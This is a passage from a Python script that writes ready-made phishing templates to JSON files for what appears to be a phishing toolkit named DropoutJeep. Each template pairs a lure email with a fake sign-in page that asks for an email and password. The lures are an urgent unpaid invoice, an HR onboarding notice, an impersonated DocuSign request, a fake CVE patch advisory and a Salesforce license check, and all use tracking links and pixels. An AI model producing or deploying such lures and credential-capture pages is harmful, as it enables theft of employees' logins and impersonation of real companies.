                <tr><td style="padding:4px 0; color:#64748B;">Total Amount:</td><td align="right" style="font-weight:700; font-size:15px; color:#1E3A8A;">$48,250.00 USD</td></tr>
                <tr><td style="padding:4px 0; color:#64748B;">Payment Terms:</td><td align="right" style="color:#0F172A;">Net 30 (Due Tomorrow)</td></tr>
              </table>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#2563EB; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:13px 32px; border-radius:6px;">Review &amp; Authorize Payment &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F8FAFC; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Global Accounts Payable &amp; Financial Controls System</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#475569; text-decoration:underline;">Unsubscribe from finance notifications</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Financial ERP Invoice Approval</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:white; width:100%; max-width:440px; border-radius:10px; border:1px solid #E2E8F0; box-shadow:0 10px 25px rgba(0,0,0,0.06); overflow:hidden; }
  .header { background:#1E3A8A; color:white; padding:24px; text-align:center; font-size:18px; font-weight:700; }
  .body-content { padding:28px; }
  .form-group { margin-bottom:18px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#334155; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .btn-blue { width:100%; background:#2563EB; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">&#128181; Enterprise ERP Portal</div>
    <div class="body-content">
      <h2 style="margin:0 0 8px 0; font-size:16px; color:#0F172A;">Invoice Approval #INV-2026-9941</h2>
      <p style="margin:0 0 20px 0; font-size:13px; color:#64748B;">Sign in with your financial authorization credentials.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Financial Officer Email</label>
          <input name="user" type="email" placeholder="finance@company.com" required>
        </div>
        <div class="form-group">
          <label>Authorization Password</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-blue">Authorize Wire Payment &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "finance_payment.json"
    },
    {
        "name": "HR Employee Onboarding Verification",
        "category": "hr",
        "description": "HR & People Operations employee onboarding document verification notice.",
        "tags": ["hr", "onboarding", "people-ops", "compliance"],
        "subject": "Action Required: Complete Your Employee Onboarding Documentation",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HR Onboarding Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#334155;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F8FAFC; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border-radius:8px; border:1px solid #E2E8F0; overflow:hidden;">
          <tr>
            <td style="background-color:#0EA5E9; padding:24px 32px;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:18px; font-weight:700;">&#128075; People Operations Portal</span></td>
                  <td align="right"><span style="background-color:#0284C7; color:#E0F2FE; font-size:11px; font-weight:700; padding:4px 8px; border-radius:4px;">ONBOARDING</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#0F172A; font-size:19px; font-weight:700;">Welcome! Complete Your Required HR Forms</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.6; color:#475569;">Hello,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">To complete your onboarding verification and finalize your employee benefits enrollment, please complete the remaining compliance documentation.</p>
              <div style="background-color:#F0F9FF; border:1px solid #BAE6FD; border-radius:6px; padding:16px; margin-bottom:24px;">
                <p style="margin:0 0 8px 0; font-size:12px; color:#0369A1; font-weight:700;">ONBOARDING CHECKLIST (2 of 4 Complete)</p>
                <ul style="margin:0; padding-left:18px; font-size:13px; color:#0284C7; line-height:1.6;">
                  <li>&#10003; Direct Deposit Form</li>
                  <li>&#10003; Code of Ethics Acknowledgement</li>
                  <li style="font-weight:700; color:#0369A1;">&#10145; I-9 Employment Eligibility Verification (Pending)</li>
                </ul>
              </div>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0EA5E9; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:13px 32px; border-radius:6px;">Complete Onboarding Form &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F8FAFC; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">People Operations &amp; Talent Experience Team</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#475569; text-decoration:underline;">Unsubscribe from HR communications</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HR Onboarding Documentation Portal</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#F8FAFC; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:white; width:100%; max-width:440px; border-radius:10px; border:1px solid #E2E8F0; box-shadow:0 10px 25px rgba(0,0,0,0.06); overflow:hidden; }
  .header { background:#0EA5E9; color:white; padding:24px; text-align:center; font-size:18px; font-weight:700; }
  .body-content { padding:28px; }
  .form-group { margin-bottom:18px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#334155; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .btn-sky { width:100%; background:#0EA5E9; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">&#128075; HR Onboarding Portal</div>
    <div class="body-content">
      <h2 style="margin:0 0 8px 0; font-size:16px; color:#0F172A;">Employee Sign-In</h2>
      <p style="margin:0 0 20px 0; font-size:13px; color:#64748B;">Sign in with your corporate SSO credentials to complete your onboarding checklist.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Employee Corporate Email</label>
          <input name="user" type="email" placeholder="newhire@company.com" required>
        </div>
        <div class="form-group">
          <label>Password</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-sky">Access Onboarding Checklist &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "hr_onboarding.json"
    },
    {
        "name": "Legal Contract Review & E-Signature",
        "category": "legal",
        "description": "DocuSign / Adobe Sign style electronic document signature request.",
        "tags": ["legal", "contract", "docusign", "e-signature"],
        "subject": "Action Required: Please DocuSign: Master Services & Confidentiality Agreement",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DocuSign Signature Request</title>
</head>
<body style="margin:0; padding:0; background-color:#F5F5F5; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#333333;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F5F5F5; padding:30px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border:1px solid #E0E0E0; border-top:5px solid #FFC425;">
          <tr>
            <td style="padding:28px 32px 16px 32px;">
              <span style="font-size:22px; font-weight:800; color:#002B49; letter-spacing:-0.5px;">DocuSign</span>
            </td>
          </tr>
          <tr>
            <td style="padding:0 32px 32px 32px;">
              <h2 style="margin:0 0 16px 0; color:#002B49; font-size:18px; font-weight:600;">Legal Counsel sent you a document to review and sign.</h2>
              <p style="margin:0 0 24px 0; font-size:14px; line-height:1.5; color:#555555;">Please review and complete the electronic signature process for the following agreement:</p>
              <table width="100%" style="background-color:#F9F9F9; border:1px solid #E5E5E5; padding:20px; margin-bottom:28px;">
                <tr>
                  <td style="font-size:40px; width:50px; text-align:center;">&#128462;</td>
                  <td style="padding-left:12px;">
                    <p style="margin:0 0 4px 0; font-size:14px; font-weight:700; color:#002B49;">Master Services &amp; Confidentiality Agreement.pdf</p>
                    <p style="margin:0; font-size:12px; color:#666666;">Sender: Legal Operations (legal@company.com)</p>
                  </td>
                </tr>
              </table>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#FFC425; color:#002B49; font-size:15px; font-weight:700; text-decoration:none; padding:14px 40px; border-radius:2px;">REVIEW DOCUMENT &rarr;</a>
                  </td>
                </tr>
              </table>
              <p style="margin:24px 0 0 0; font-size:12px; color:#777777; line-height:1.5;">This document was sent to you using DocuSign Electronic Signature Service.</p>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F5F5F5; padding:16px 32px; font-size:11px; color:#888888; border-top:1px solid #E0E0E0;">
              <p style="margin:0 0 4px 0;">Powered by DocuSign E-Signature System</p>
              <p style="margin:0;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#666666; text-decoration:underline;">Unsubscribe from document alerts</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DocuSign — Review Document</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background-color:#F5F5F5; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; flex-direction:column; min-height:100vh; justify-content:center; align-items:center; }
  .card { background:white; width:100%; max-width:440px; padding:36px; border-top:5px solid #FFC425; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
  .logo { font-size:24px; font-weight:800; color:#002B49; margin-bottom:20px; }
  .doc-box { background:#F9F9F9; border:1px solid #E5E5E5; padding:14px; margin-bottom:24px; font-size:13px; font-weight:600; color:#002B49; display:flex; align-items:center; gap:10px; }
  .form-group { margin-bottom:16px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#555555; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px 12px; border:1px solid #CCCCCC; font-size:14px; outline:none; }
  .btn-gold { width:100%; background:#FFC425; color:#002B49; border:none; padding:12px; font-size:14px; font-weight:700; cursor:pointer; margin-top:8px; }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">DocuSign</div>
    <h2 style="margin:0 0 12px 0; font-size:16px; color:#002B49;">Identity Verification Required</h2>
    <div class="doc-box">
      <span style="font-size:20px;">&#128462;</span> Master Services Agreement.pdf
    </div>
    <form method="post">
      <input type="hidden" name="token" value="{{TOKEN}}">
      <div class="form-group">
        <label>Recipient Email Address</label>
        <input name="user" type="email" placeholder="signer@company.com" required>
      </div>
      <div class="form-group">
        <label>Signer Password / Access Code</label>
        <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
      </div>
      <button type="submit" class="btn-gold">Access Document for Signature &rarr;</button>
    </form>
  </div>
</body>
</html>""",
        "filename": "legal_contract.json"
    },
    {
        "name": "Engineering Critical Patch Advisory",
        "category": "engineering",
        "description": "DevOps & Infrastructure vulnerability security advisory & patch deployment notice.",
        "tags": ["engineering", "devops", "security", "patch", "cve"],
        "subject": "CRITICAL ADVISORY: Emergency Patch Deployment Required (CVE-2026-8812)",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Engineering Security Advisory</title>
</head>
<body style="margin:0; padding:0; background-color:#0F172A; font-family:ui-monospace, SFMono-Regular, monospace; color:#E2E8F0;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#0F172A; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#1E293B; border-radius:8px; border:1px solid #334155; overflow:hidden;">
          <tr>
            <td style="background-color:#020617; padding:24px 32px; border-bottom:2px solid #EF4444;">
              <table width="100%">
                <tr>
                  <td><span style="color:#EF4444; font-size:16px; font-weight:700;">&#128678; SECURITY ADVISORY</span></td>
                  <td align="right"><span style="background-color:#7F1D1D; color:#FCA5A5; font-size:11px; font-weight:700; padding:3px 8px; border-radius:4px;">SEV-1 CRITICAL</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 12px 0; color:#FFFFFF; font-size:18px; font-weight:700;">Vulnerability CVE-2026-8812 Patch Required</h2>
              <p style="margin:0 0 16px 0; font-size:13px; line-height:1.6; color:#94A3B8;">Attention Engineering Team,</p>
              <p style="margin:0 0 20px 0; font-size:13px; line-height:1.6; color:#94A3B8;">A zero-day remote code execution vulnerability (CVE-2026-8812) has been identified affecting active production Kubernetes clusters. Immediate patch deployment is mandated.</p>
              <div style="background-color:#020617; border:1px solid #334155; border-radius:6px; padding:16px; margin-bottom:24px; font-size:12px; color:#CBD5E1;">
                <p style="margin:0 0 6px 0; color:#F87171; font-weight:700;">AFFECTED SYSTEMS:</p>
                <p style="margin:0 0 4px 0;">&bull; Cluster: prod-k8s-us-east-1</p>
                <p style="margin:0 0 4px 0;">&bull; Target Service: Core Ingress Controller</p>
                <p style="margin:0;">&bull; Remediation Deadline: 18:00 UTC</p>
              </div>
              <table role="presentation" width="100%">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#DC2626; color:#FFFFFF; font-size:13px; font-weight:700; text-decoration:none; padding:12px 32px; border-radius:6px;">Deploy Security Patch &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#020617; padding:20px 32px; border-top:1px solid #1E293B; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Infrastructure Security &amp; Site Reliability Engineering</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#94A3B8; text-decoration:underline;">Unsubscribe from engineering advisories</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Engineering Console — Patch Deployment</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#0F172A; color:#E2E8F0; font-family:ui-monospace, monospace; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .console { background:#020617; width:100%; max-width:480px; border-radius:8px; border:1px solid #334155; box-shadow:0 20px 25px -5px rgba(0,0,0,0.6); overflow:hidden; }
  .header { background:#1E293B; padding:16px 20px; font-size:13px; font-weight:700; color:#EF4444; border-bottom:1px solid #334155; display:flex; justify-content:space-between; }
  .body { padding:24px; }
  .form-group { margin-bottom:16px; }
  .form-group label { display:block; font-size:11px; color:#94A3B8; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px; background:#0F172A; border:1px solid #334155; border-radius:4px; color:#F8FAFC; font-size:13px; outline:none; font-family:monospace; }
  .btn-red { width:100%; background:#DC2626; color:white; border:none; padding:11px; font-size:13px; font-weight:700; border-radius:4px; cursor:pointer; font-family:monospace; }
</style>
</head>
<body>
  <div class="console">
    <div class="header">
      <span>[!] PATCH CONSOLE (CVE-2026-8812)</span>
      <span style="color:#22C55E;">ONLINE</span>
    </div>
    <div class="body">
      <p style="margin:0 0 16px 0; font-size:12px; color:#94A3B8;">Engineer SSH / Portal Authentication Required:</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Engineer Handle / SSO Email</label>
          <input name="user" type="text" placeholder="engineer@devops.local" required>
        </div>
        <div class="form-group">
          <label>SSH / Portal Key Passphrase</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-red">Authenticate &amp; Execute Patch Rollout &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "engineering_patch.json"
    },
    {
        "name": "Salesforce CRM License Verification",
        "category": "sales",
        "description": "Enterprise CRM account maintenance & license verification notice.",
        "tags": ["sales", "crm", "salesforce", "hubspot"],
        "subject": "Action Required: Re-verify CRM License Credentials",
        "author": "DropoutJeep Built-in",
        "body_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CRM Account Notice</title>
</head>
<body style="margin:0; padding:0; background-color:#F0F9FF; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color:#334155;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color:#F0F9FF; padding:40px 10px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width:580px; background-color:#FFFFFF; border-radius:8px; border:1px solid #BAE6FD; overflow:hidden;">
          <tr>
            <td style="background-color:#0284C7; padding:24px 32px;">
              <table width="100%">
                <tr>
                  <td><span style="color:#FFFFFF; font-size:18px; font-weight:700;">&#9729; Enterprise CRM Operations</span></td>
                  <td align="right"><span style="background-color:#0369A1; color:#E0F2FE; font-size:11px; font-weight:700; padding:4px 8px; border-radius:4px;">SALESFORCE SSO</span></td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px;">
              <h2 style="margin:0 0 16px 0; color:#0F172A; font-size:19px; font-weight:700;">CRM User License Audit &amp; Verification</h2>
              <p style="margin:0 0 16px 0; font-size:14px; line-height:1.6; color:#475569;">Dear Sales Team Member,</p>
              <p style="margin:0 0 20px 0; font-size:14px; line-height:1.6; color:#475569;">During our annual enterprise CRM seat allocation audit, your account was flagged for mandatory identity re-verification to maintain uninterrupted access to sales pipeline records and customer accounts.</p>
              <table role="presentation" width="100%" style="margin-bottom:28px;">
                <tr>
                  <td align="center">
                    <a href="{{TRACK_LINK}}" style="display:inline-block; background-color:#0284C7; color:#FFFFFF; font-size:14px; font-weight:700; text-decoration:none; padding:13px 32px; border-radius:6px;">Re-Verify CRM Access &rarr;</a>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="background-color:#F8FAFC; padding:20px 32px; border-top:1px solid #E2E8F0; text-align:center;">
              <p style="margin:0 0 6px 0; font-size:11px; color:#64748B;">Global Sales Operations &amp; CRM Systems Administration</p>
              <p style="margin:0; font-size:11px;"><a href="{{UNSUBSCRIBE_LINK}}" style="color:#475569; text-decoration:underline;">Unsubscribe from CRM alerts</a></p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
  {{PIXEL}}
</body>
</html>""",
        "landing_html": """<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enterprise CRM Sign In</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; padding:0; background:#F0F9FF; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; }
  .card { background:white; width:100%; max-width:440px; border-radius:10px; border:1px solid #BAE6FD; box-shadow:0 10px 25px rgba(2,132,199,0.08); overflow:hidden; }
  .header { background:#0284C7; color:white; padding:24px; text-align:center; font-size:18px; font-weight:700; }
  .body-content { padding:28px; }
  .form-group { margin-bottom:18px; }
  .form-group label { display:block; font-size:12px; font-weight:600; color:#334155; margin-bottom:6px; }
  .form-group input { width:100%; padding:10px 14px; border:1px solid #CBD5E1; border-radius:6px; font-size:14px; outline:none; }
  .btn-blue { width:100%; background:#0284C7; color:white; border:none; padding:12px; font-size:14px; font-weight:700; border-radius:6px; cursor:pointer; }
</style>
</head>
<body>
  <div class="card">
    <div class="header">&#9729; Enterprise CRM Single Sign-On</div>
    <div class="body-content">
      <h2 style="margin:0 0 8px 0; font-size:16px; color:#0F172A;">CRM Account Verification</h2>
      <p style="margin:0 0 20px 0; font-size:13px; color:#64748B;">Sign in with your sales corporate credentials.</p>
      <form method="post">
        <input type="hidden" name="token" value="{{TOKEN}}">
        <div class="form-group">
          <label>Sales Email</label>
          <input name="user" type="email" placeholder="sales@company.com" required>
        </div>
        <div class="form-group">
          <label>Password</label>
          <input name="pass" type="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
        </div>
        <button type="submit" class="btn-blue">Re-Verify License &rarr;</button>
      </form>
    </div>
  </div>
</body>
</html>""",
        "filename": "sales_crm.json"
    }
]

out_dir = pathlib.Path("dropoutjeep_lib/data/templates")
for t in templates:
    fn = t.pop("filename")
    target_file = out_dir / fn
    target_file.write_text(json.dumps(t, indent=2), encoding="utf-8")
    print(f"Wrote {fn}")
